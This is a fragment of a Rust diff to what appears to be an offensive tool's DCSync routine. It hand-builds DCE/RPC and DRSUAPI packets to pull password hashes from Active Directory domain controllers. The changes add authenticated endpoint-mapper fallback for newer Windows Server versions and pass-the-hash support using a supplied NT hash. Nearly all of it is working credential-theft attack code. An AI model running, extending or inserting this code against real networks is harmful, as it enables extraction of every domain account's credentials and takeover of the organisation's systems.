+                        .map_err(|_| "EPM resolution timed out (10s)".to_string())?
+                        .map_err(|e| format!("EPM resolve DRSUAPI on {target}: {e}"))?
+                }
+            }
+        }
+    };
 
     debug!("DCSync TCP: resolved DRSUAPI to {host}:{port}");
 
@@ -4232,16 +4741,23 @@ async fn dcsync_tcp_transact(target: &str, pdu: &[u8]) -> std::result::Result<Ve
 }
 
 /// Send a DRSUAPI RPC PDU, trying SMB named pipes first then TCP via EPM.
+/// When credentials are provided, uses authenticated EPM for the TCP fallback
+/// (required by WS2025+ which rejects unauthenticated EPM binds).
 async fn dcsync_send_pdu(
     smb: &SmbSession,
     dc_ip: &str,
     pdu: &[u8],
+    domain: Option<&str>,
+    username: Option<&str>,
+    nt_hash: Option<&[u8]>,
 ) -> std::result::Result<Vec<u8>, String> {
     match dcsync_pipe_transact(smb, pdu).await {
         Ok(r) => Ok(r),
         Err(pipe_err) => {
             debug!("DCSync: pipe failed ({pipe_err}), trying TCP via EPM...");
-            dcsync_tcp_transact(dc_ip, pdu).await
+            // tree_disconnect first to clean up from the failed pipe_transact tree connections
+            let _ = smb.tree_disconnect().await;
+            dcsync_tcp_transact(smb, dc_ip, pdu, domain, username, nt_hash).await
         }
     }
 }
@@ -4265,29 +4781,48 @@ async fn exec_dcsync(
         Err(e) => return e,
     };
 
+    // Compute NT hash for authenticated EPM resolution (WS2025 requires it)
+    let nt_hash: Vec<u8> = if ctx.use_hash {
+        // Parse hex NT hash from string (32 hex chars = 16 bytes)
+        let secret = ctx.secret.trim();
+        let mut bytes = Vec::with_capacity(16);
+        for chunk in secret.as_bytes().chunks(2) {
+            if chunk.len() < 2 {
+                break;
+            }
+            let high = (chunk[0] as char).to_digit(16).unwrap_or(0) as u8;
+            let low = (chunk[1] as char).to_digit(16).unwrap_or(0) as u8;
+            bytes.push((high << 4) | low);
+        }
+        bytes
+    } else {
+        nt_hash(&ctx.secret)
+    };
+
     // Step 2: Try SMB named pipes first, then TCP via EPM as fallback.
     // On WS2025+, DRSUAPI named pipe may not be available.
     let dcsync_dc_ip = ctx.dc_ip.clone();
+    let dcsync_domain = ctx.domain.clone();
+    let dcsync_username = ctx.username.clone();
 
     // Build RPC bind PDU for MS-DRSR (e3514235-4b06-11d1-ab04-00c04fc2dcd2)
+    // Use u16 for num_ctx_items / num_trans_syn (matching DCE/RPC spec), NOT u8+padding.
     let mut bind_pdu = Vec::new();
     bind_pdu.extend_from_slice(&[5, 0, 11, 3]);
-    bind_pdu.extend_from_slice(&[0x10, 0, 0, 0]);
+    bind_pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
     let frag_offset = bind_pdu.len();
-    bind_pdu.extend_from_slice(&[0, 0]); // frag_len
-    bind_pdu.extend_from_slice(&[0, 0]); // auth_len
-    bind_pdu.extend_from_slice(&1u32.to_le_bytes());
+    bind_pdu.extend_from_slice(&0u16.to_le_bytes()); // frag_len
+    bind_pdu.extend_from_slice(&0u16.to_le_bytes()); // auth_len
+    bind_pdu.extend_from_slice(&1u32.to_le_bytes()); // call_id
     bind_pdu.extend_from_slice(&4096u16.to_le_bytes());
     bind_pdu.extend_from_slice(&4096u16.to_le_bytes());
-    bind_pdu.extend_from_slice(&0u32.to_le_bytes());
-    bind_pdu.push(1);
-    bind_pdu.extend_from_slice(&[0, 0, 0]);
-    bind_pdu.extend_from_slice(&0u16.to_le_bytes());
-    bind_pdu.push(1);
-    bind_pdu.push(0);
+    bind_pdu.extend_from_slice(&0u32.to_le_bytes()); // assoc_group
+    bind_pdu.extend_from_slice(&1u16.to_le_bytes()); // num_ctx_items (u16, per spec)
+    bind_pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id (u16)
+    bind_pdu.extend_from_slice(&1u16.to_le_bytes()); // num_trans_syn (u16, per spec)
     bind_pdu.extend_from_slice(&DRSR_UUID_BYTES);
     bind_pdu.extend_from_slice(&4u16.to_le_bytes()); // DRSR version 4
-    bind_pdu.extend_from_slice(&0u16.to_le_bytes());
+    bind_pdu.extend_from_slice(&0u16.to_le_bytes()); // version minor
     bind_pdu.extend_from_slice(&[
         0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48,
         0x60,
@@ -4296,7 +4831,7 @@ async fn exec_dcsync(
     let frag_len = bind_pdu.len() as u16;
     bind_pdu[frag_offset..frag_offset + 2].copy_from_slice(&frag_len.to_le_bytes());
 
-    let bind_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &bind_pdu).await {
+    let bind_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &bind_pdu, Some(&dcsync_domain), Some(&dcsync_username), Some(&nt_hash)).await {
         Ok(r) => r,
         Err(e) => {
             return StepResult {
@@ -4328,7 +4863,7 @@ async fn exec_dcsync(
     drs_bind_stub.extend_from_slice(&extensions);
 
     let drs_bind_req = build_rpc_request(0, &drs_bind_stub);
-    let drs_bind_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &drs_bind_req).await {
+    let drs_bind_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &drs_bind_req, Some(&dcsync_domain), Some(&dcsync_username), Some(&nt_hash)).await {
         Ok(r) => r,
         Err(e) => {
             return StepResult {
@@ -4445,7 +4980,7 @@ async fn exec_dcsync(
         gnc_stub.extend_from_slice(&7u32.to_le_bytes());
 
         let gnc_req = build_rpc_request(3, &gnc_stub);
-        let gnc_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &gnc_req).await {
+        let gnc_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &gnc_req, Some(&dcsync_domain), Some(&dcsync_username), Some(&nt_hash)).await {
             Ok(r) => r,
             Err(e) => {
                 warn!("  DRSGetNCChanges error (may still have partial data): {e}");
@@ -4578,7 +5113,7 @@ async fn exec_dcsync(
             false,
         );
 
-        let gnc_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &gnc_req).await {
+        let gnc_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &gnc_req, Some(&dcsync_domain), Some(&dcsync_username), Some(&nt_hash)).await {
             Ok(r) => r,
             Err(e) => {
                 warn!("  DCSync batch {batch_count} failed: {e}");
